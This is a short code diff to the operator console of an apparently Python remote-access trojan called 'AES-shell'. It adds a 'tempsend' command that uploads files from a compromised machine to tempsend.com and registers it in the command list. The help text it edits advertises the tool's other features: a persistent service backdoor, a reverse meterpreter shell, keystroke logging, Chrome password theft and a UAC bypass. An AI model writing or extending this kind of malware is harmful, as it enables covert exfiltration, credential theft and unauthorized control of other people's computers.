@@ -124,9 +124,9 @@ def fmainloop(first):											## This loop is used to accept a new connection
 				continue
 
 def fhelp():
-	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome, chromium and aviator stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
+	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n  tempsend file       -  Upload a file from remote pwd to tempsend.com**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome, chromium and aviator stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
 
-commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ']
+commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ', 'tempsend ']
 try:
 	readline.parse_and_bind("tab: complete")
 	readline.set_completer(completer)
